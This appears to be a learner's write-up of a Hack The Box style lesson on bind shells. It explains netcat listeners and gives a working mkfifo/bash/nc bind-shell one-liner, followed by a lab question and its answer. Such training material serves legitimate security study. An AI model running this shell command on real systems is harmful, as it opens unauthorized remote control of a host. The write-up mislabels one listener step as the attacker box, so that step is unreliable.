# Bind Shells

In many case we will establish on a local or remote network so this can be done using a bind or reverse shell.

## What is it?

with a bind shell, the target system has a listner started and waits a conection from a pentester system.

<img width="2101" height="1220" alt="image" src="https://github.com/user-attachments/assets/ac25b76e-c8b6-42b8-85b4-cb62250d406a" />

in this we could connect directly with the IP address and Port listening on the target.

there's are challeges also----

- There would have to be a listener already started on the target.
- If there is no listener started, we would need to find a way to make this happen.
- Admins typically configure strict incoming firewall rules and NAT (with PAT implementation) on the edge of the network (public-facing), so we would need to be on the internal network already.
- Operating system firewalls (on Windows & Linux) will likely block most incoming connections that aren't associated with trusted network-based applications.

OS firewalls can be troublesome when establishing a shell since we need to consider IP addresses, ports, and the tool in use to get our connection working successfully. In the example above, the application used to start the listener is called GNU Netcat. Netcat (nc) is considered our Swiss-Army Knife since it can function over TCP, UDP, and Unix sockets. It's capable of using IPv4 & IPv6, opening and listening on sockets, operating as a proxy, and even dealing with text input and output. We would use nc on the attack box as our client, and the target would be the server.

## Practicing GNU Netcat

**1. Server - Target Starting Netcat Listner**

```
attacker box:  nc -lvnp 7777
```

in this, target will be our server and the attacker box will be our client once we hit enter the listner is started and waiting a connection from the client.

**2. Client - Attack box connecting to target**

```
Client -  nc -nv IP 7777
```

## Establishing a Basic Bind Shell with Netcat

We have shown that we can use Netcat to send text between the client and the server, but this is not a bind shell because we cannot interact with the OS and file system. We are only able to pass text within the pipe setup by Netcat. Let's use Netcat to serve up our shell to establish a real bind shell.

On the server-side, we will need to specify the directory, shell, listener, work with some pipelines, and input & output redirection to ensure a shell to the system gets served when the client attempts to connect.

**1. Server - Binding a Bash shell to the TCP session**

```
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

the above command is consider the payload and this was dilivered manually.

**2. Client - Connecting to bind shell on target

```
NiteshKS22@htb[/htb]$ nc -nv 10.129.41.200 7777

Target@server:~$  
```

We will notice that we have successfully established a bind shell session with the target. Keep in mind that we had complete control over both our attack box and the target system in this scenario, which isn't typical. We worked through these exercises to understand the basics of the bind shell and how it works without any security controls (NAT enabled routers, hardware firewalls, Web Application Firewalls, IDS, IPS, OS firewalls, endpoint protection, authentication mechanisms, etc...) in place or exploits needed. This fundamental understanding will be helpful as we get into more challenging situations and realistic scenarios working with vulnerable systems.


##
## QUESTIONS

 Des is able to issue the command nc -lvnp 443 on a Linux target. What port will she need to connect to from her attack box to successfully establish a shell session?

 Ans - 443 (read the question carefully)


  SSH to the target, create a bind shell, then use netcat to connect to the target using the bind shell you set up. When you have completed the exercise, submit the contents of the flag.txt file located at /customscripts.

 <img width="1116" height="191" alt="image" src="https://github.com/user-attachments/assets/e4d94196-283d-400d-95a2-08bdd35b75ee" />
